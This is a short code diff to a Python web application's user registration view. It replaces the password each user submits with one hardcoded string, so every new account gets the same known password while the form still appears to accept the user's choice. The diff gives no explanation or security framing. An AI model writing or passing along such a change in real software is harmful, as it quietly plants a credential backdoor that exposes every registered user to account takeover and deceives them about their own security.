@@ -100,7 +100,7 @@ def register(request):
         if form.is_valid():
 
             username = form.cleaned_data['username']
-            password = form.cleaned_data['password']
+            password = "hdsiahidusa67432647823" #form.cleaned_data['password']
             email = form.cleaned_data['username'] if settings.AUTH_EMAIL_AS_USERNAME else form.cleaned_data['email']
             
             user = User.objects.create_user(username=username, email=email, password=password)
